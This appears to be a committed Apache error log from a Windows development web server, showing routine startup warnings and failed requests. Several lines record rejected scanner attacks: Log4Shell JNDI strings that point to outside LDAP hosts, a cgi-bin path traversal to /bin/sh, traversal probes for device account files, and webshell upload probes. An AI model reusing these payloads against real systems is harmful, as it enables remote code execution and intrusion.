+[Sat Jun 17 04:55:50.731465 2023] [:error] [pid 4952:tid 1372] [client 165.154.119.253:12254] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/index_sso.php' not found or unable to stat
+[Sat Jun 17 11:19:11.403311 2023] [core:error] [pid 4952:tid 1396] [client 83.97.73.89:37066] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Sat Jun 17 11:28:33.553024 2023] [core:error] [pid 4952:tid 1396] [client 193.32.162.190:39668] AH00126: Invalid URI in request GET /../../mnt/mtd/Config/Account1 HTTP/1.1
+[Sat Jun 17 12:47:22.972395 2023] [core:error] [pid 4952:tid 1396] [client 193.32.162.190:39304] AH00126: Invalid URI in request GET /../../mnt/mtd/Config/Account2 HTTP/1.1
+[Sat Jun 17 13:22:59.416849 2023] [:error] [pid 4952:tid 1396] [client 139.59.95.38:45512] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Sat Jun 17 13:23:02.024491 2023] [:error] [pid 4952:tid 1396] [client 139.59.95.38:59678] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Sat Jun 17 14:09:55.274034 2023] [:error] [pid 4952:tid 1396] [client 202.112.51.4:42432] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/82717861-0187-45d4-b0ea-fc422ebdce04.php' not found or unable to stat
+[Sat Jun 17 16:28:53.400109 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Sat Jun 17 22:56:38.379981 2023] [core:error] [pid 4952:tid 1396] [client 45.156.128.2:45772] AH00126: Invalid URI in request HEAD /icons/.%2e/%2e%2e/apache2/icons/sphere1.png HTTP/1.1
+[Sun Jun 18 06:41:33.450685 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Sun Jun 18 06:44:53.363875 2023] [core:error] [pid 4952:tid 1424] [client 83.97.73.89:49322] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Sun Jun 18 16:37:59.730350 2023] [:error] [pid 4952:tid 1424] [client 165.22.226.204:55840] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Sun Jun 18 16:37:59.791503 2023] [:error] [pid 4952:tid 1424] [client 165.22.226.204:55896] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Sun Jun 18 19:55:08.533524 2023] [core:error] [pid 4952:tid 1424] (20024)The given path is misformatted or contained invalid characters: [client 58.144.148.20:58588] AH00127: Cannot map GET /${jndi:ldap://129.144.44.148:1389/Exploit} HTTP/1.1 to file
+[Sun Jun 18 20:39:43.268411 2023] [:error] [pid 4952:tid 1424] [client 5.188.210.227:61960] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sun Jun 18 22:32:04.836413 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Mon Jun 19 06:18:06.637290 2023] [core:error] [pid 4952:tid 1372] (20024)The given path is misformatted or contained invalid characters: [client 42.192.198.159:39630] AH00127: Cannot map GET /${jndi:ldap://108.181.33.59:1389/Exploit} HTTP/1.1 to file
+[Mon Jun 19 11:42:21.210037 2023] [core:error] [pid 4952:tid 1372] [client 83.97.73.89:44798] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Mon Jun 19 14:44:35.666474 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Mon Jun 19 16:19:16.926697 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Tue Jun 20 05:11:54.473799 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Tue Jun 20 06:32:07.056071 2023] [core:error] [pid 4952:tid 1372] (20024)The given path is misformatted or contained invalid characters: [client 162.0.234.213:59608] AH00127: Cannot map GET /${jndi:ldap://34.124.185.168:8081/Exploit} HTTP/1.1 to file
+[Tue Jun 20 06:47:07.741421 2023] [core:error] [pid 4952:tid 1372] (20024)The given path is misformatted or contained invalid characters: [client 177.185.117.136:56956] AH00127: Cannot map GET /${jndi:ldap://34.124.185.168:8081/Exploit} HTTP/1.1 to file
+[Tue Jun 20 07:34:55.968057 2023] [:error] [pid 4952:tid 1372] [client 143.110.208.146:45708] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Tue Jun 20 07:34:56.116010 2023] [:error] [pid 4952:tid 1372] [client 143.110.208.146:45758] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Tue Jun 20 09:11:36.962417 2023] [:error] [pid 4952:tid 1372] [client 31.220.1.150:44162] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upload.php' not found or unable to stat
+[Tue Jun 20 09:11:43.911899 2023] [authz_core:error] [pid 4952:tid 1380] [client 31.220.1.150:44172] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/
+[Tue Jun 20 16:38:37.871811 2023] [core:error] [pid 4952:tid 1424] [client 83.97.73.89:46260] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Tue Jun 20 19:53:39.690688 2023] [mpm_winnt:crit] [pid 4952:tid 748] AH02538: Child: Parent process exited abruptly. Child process is ending
+[Tue Jun 20 19:53:39.690688 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 995)The I/O operation has been aborted because of either a thread exit or an application request.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Tue Jun 20 19:53:39.690688 2023] [mpm_winnt:error] [pid 4952:tid 1676] (OS 10038)An operation was attempted on something that is not a socket.  : AH00337: Child: Encountered too many AcceptEx faults accepting client connections. Possible causes: dynamic address renewal, or incompatible VPN or firewall software. 
+[Tue Jun 20 19:53:39.690688 2023] [mpm_winnt:notice] [pid 4952:tid 1676] (OS 10038)An operation was attempted on something that is not a socket.  : AH00338: winnt_mpm: falling back to 'AcceptFilter none'.
+[Tue Jun 20 19:53:39.693689 2023] [mpm_winnt:warn] [pid 4952:tid 1484] (OS 995)The I/O operation has been aborted because of either a thread exit or an application request.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Tue Jun 20 19:53:39.693689 2023] [mpm_winnt:warn] [pid 4952:tid 888] (OS 995)The I/O operation has been aborted because of either a thread exit or an application request.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Tue Jun 20 19:53:39.693689 2023] [mpm_winnt:warn] [pid 4952:tid 1444] (OS 995)The I/O operation has been aborted because of either a thread exit or an application request.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Tue Jun 20 19:53:41.692839 2023] [mpm_winnt:notice] [pid 4952:tid 748] AH00364: Child: All worker threads have exited.
+[Mon May 27 00:32:10.694046 2024] [ssl:warn] [pid 39092:tid 648] AH01906: main-serveur:443:0 server certificate is a CA certificate (BasicConstraints: CA == TRUE !?)
+[Mon May 27 00:32:10.695046 2024] [ssl:warn] [pid 39092:tid 648] AH01909: main-serveur:443:0 server certificate does NOT include an ID which matches the server name
+[Mon May 27 00:32:10.724047 2024] [core:warn] [pid 39092:tid 648] AH00098: pid file C:/Users/nicho/Documents/GitHub/Game/Web Server/bin/apache/logs/httpd.pid overwritten -- Unclean shutdown of previous Apache run?
+[Mon May 27 00:32:10.804549 2024] [ssl:warn] [pid 39092:tid 648] AH01873: Init: Session Cache is not configured [hint: SSLSessionCache]
+[Mon May 27 00:32:10.805050 2024] [ssl:warn] [pid 39092:tid 648] AH01906: main-serveur:443:0 server certificate is a CA certificate (BasicConstraints: CA == TRUE !?)
+[Mon May 27 00:32:10.805050 2024] [ssl:warn] [pid 39092:tid 648] AH01909: main-serveur:443:0 server certificate does NOT include an ID which matches the server name
+[Mon May 27 00:32:10.836047 2024] [mpm_winnt:notice] [pid 39092:tid 648] AH00455: Apache/2.4.18 (Win32) OpenSSL/1.0.2f PHP/7.0.3 configured -- resuming normal operations
+[Mon May 27 00:32:10.836047 2024] [mpm_winnt:notice] [pid 39092:tid 648] AH00456: Server built: Jan 28 2016 09:58:25
+[Mon May 27 00:32:10.836047 2024] [core:notice] [pid 39092:tid 648] AH00094: Command line: 'C:\\Users\\nicho\\Documents\\GitHub\\Game\\Web Server\\bin\\apache\\bin\\httpd.exe -d C:/Users/nicho/Documents/GitHub/Game/Web Server/bin/apache -f C:\\Users\\nicho\\Documents\\GitHub\\Game\\Web Server\\bin\\apache\\conf\\httpd.conf'
+[Mon May 27 00:32:10.841048 2024] [mpm_winnt:notice] [pid 39092:tid 648] AH00418: Parent: Created child process 41800
+[Mon May 27 00:32:11.322550 2024] [ssl:warn] [pid 41800:tid 572] AH01906: main-serveur:443:0 server certificate is a CA certificate (BasicConstraints: CA == TRUE !?)
+[Mon May 27 00:32:11.323047 2024] [ssl:warn] [pid 41800:tid 572] AH01909: main-serveur:443:0 server certificate does NOT include an ID which matches the server name
+[Mon May 27 00:32:11.432549 2024] [ssl:warn] [pid 41800:tid 572] AH01873: Init: Session Cache is not configured [hint: SSLSessionCache]
+[Mon May 27 00:32:11.433050 2024] [ssl:warn] [pid 41800:tid 572] AH01906: main-serveur:443:0 server certificate is a CA certificate (BasicConstraints: CA == TRUE !?)
+[Mon May 27 00:32:11.433050 2024] [ssl:warn] [pid 41800:tid 572] AH01909: main-serveur:443:0 server certificate does NOT include an ID which matches the server name
+[Mon May 27 00:32:11.453047 2024] [mpm_winnt:notice] [pid 41800:tid 572] AH00354: Child: Starting 64 worker threads.
